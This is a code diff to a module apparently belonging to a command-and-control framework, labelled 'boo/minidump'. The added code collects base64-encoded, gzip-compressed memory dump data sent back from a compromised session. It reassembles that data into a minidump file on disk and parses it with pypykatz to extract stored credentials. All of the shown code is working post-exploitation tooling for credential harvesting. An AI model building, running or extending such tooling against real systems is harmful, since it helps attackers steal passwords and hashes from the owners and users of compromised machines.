@@ -1,3 +1,8 @@
+from gzip import GzipFile
+from base64 import b64decode
+from pypykatz.pypykatz import pypykatz
+
+
 class STModule:
     def __init__(self):
         self.name = 'boo/minidump'
@@ -17,3 +22,24 @@ class STModule:
             src = module_src.read()
             src = src.replace('DUMPFILE_PATH', self.options['Dumpfile']['Value'])
             return src
+
+    def process(self, context, output):
+        encoded_dmp = f"./logs/{context.session.guid}/boo_minidump.dmp.enc"
+        compressed_dmp = f"./logs/{context.session.guid}/boo_minidump.dmp.comp"
+        dmp = f"./logs/{context.session.guid}/boo_minidump.dmp"
+
+        if output == "EOF":
+            with open(encoded_dmp) as enc_dump:
+                with open(compressed_dmp, "wb") as comp_dump:
+                    comp_dump.write(b64decode(enc_dump.read()))
+
+            with open(compressed_dmp, "rb") as comp_dump:
+                with open(dmp, "wb") as inflated_dmp:
+                    with GzipFile(fileobj=comp_dump) as gzip_dmp:
+                        inflated_dmp.write(gzip_dmp.read())
+
+            return pypykatz.parse_minidump_file(dmp)
+
+        else:
+            with open(encoded_dmp, 'a+') as dumpfile:
+                dumpfile.write(output)
